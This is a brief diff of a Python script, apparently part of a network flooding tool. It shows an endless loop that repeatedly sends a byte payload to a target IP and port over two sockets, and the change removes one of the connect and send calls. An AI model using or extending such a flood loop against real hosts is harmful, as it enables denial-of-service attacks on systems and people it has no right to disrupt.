@@ -74,8 +74,6 @@ def aa(num):
     while True:
         try:
             sock.sendto(bytes, (ip, port))
-            sock.connect((ip,port))
-            sock2.sendto(bytes, (ip, port))
             sock2.connect((ip, port))
         except:
             print(colorama.Fore.RED + "[-] Connection error!")
